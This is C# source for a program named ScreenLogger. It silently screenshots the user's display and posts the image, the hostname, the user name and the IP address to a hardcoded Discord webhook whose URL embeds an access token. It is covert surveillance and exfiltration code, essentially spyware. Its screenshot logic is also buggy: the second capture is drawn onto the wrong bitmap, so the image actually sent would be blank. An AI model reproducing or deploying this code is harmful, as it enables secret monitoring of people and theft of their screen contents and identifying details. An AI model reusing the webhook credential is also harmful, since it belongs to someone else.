using System;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Windows.Forms;

namespace ScreenLogger
{
    internal class Program
    {
        static void Main(string[] args)
        {
            // Take screenshot
            Bitmap screenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                                           Screen.PrimaryScreen.Bounds.Height,
                                           System.Drawing.Imaging.PixelFormat.Format32bppArgb);
            Bitmap screen2 = new Bitmap(Screen.AllScreens[1].Bounds.Width,
                                           Screen.AllScreens[1].Bounds.Height,
                                           System.Drawing.Imaging.PixelFormat.Format32bppArgb);
            Graphics graphics = Graphics.FromImage(screenshot);
            Graphics graphicsSecond = Graphics.FromImage(screenshot);
            graphics.CopyFromScreen(0, 0, 0, 0, screenshot.Size);
            graphicsSecond.CopyFromScreen(Screen.AllScreens[1].Bounds.X, Screen.AllScreens[1].Bounds.Y, 0, 0, screenshot.Size);

            // Save screenshot to memory stream
            MemoryStream stream = new MemoryStream();
            screenshot.Save(stream, System.Drawing.Imaging.ImageFormat.Png);
            MemoryStream stream2 = new MemoryStream();
            screen2.Save(stream2, System.Drawing.Imaging.ImageFormat.Png);

            // Send screenshot to Discord webhook
            byte[] imageBytes = stream.ToArray();
            byte[] imageBytesSecond = stream2.ToArray();
            string webhookUrl = "https://discord.com/api/webhooks/1071565067109277706/Aq1uuQZJrQkOC6mZUGjr0lnQfr3qN2Dt6zRNELyaqqkMrbKpLYv9DRQ8YDwxiGA2DU-L";
            Console.WriteLine(imageBytesSecond.Length);
            HttpClient client = new HttpClient();
            MultipartFormDataContent formDataContent = new MultipartFormDataContent
            {
                { new StringContent("Screenshot from Device Name: " + Dns.GetHostName() + " : User Profile Name: " + Environment.UserName,Encoding.UTF8),"\"content\"" },
                { new ByteArrayContent(imageBytesSecond, 0, imageBytesSecond.Length), ".png", "screenshot.png" },
                { new StringContent("IP Address: " + Dns.GetHostEntry(Dns.GetHostName()).AddressList.First(),Encoding.UTF8),"\"content\"" }
                //{ new ByteArrayContent(imageBytesSecond, 0, imageBytesSecond.Length), ".png", "screenshot2.png" }
            };
            client.PostAsync(webhookUrl, formDataContent).Wait();
            client.Dispose();
            //using (var client = new WebClient())
            //{
            //    client.Headers[HttpRequestHeader.ContentType] = "application/json";
            //    string json = "{\"content\":\"Screenshot:\",\"file\":{\"file\":\"" + base64Image + "\",\"name\":\"screenshot.png\"}}";
            //    client.UploadString(webhookUrl, "POST", json);
            //}
        }
    }
}
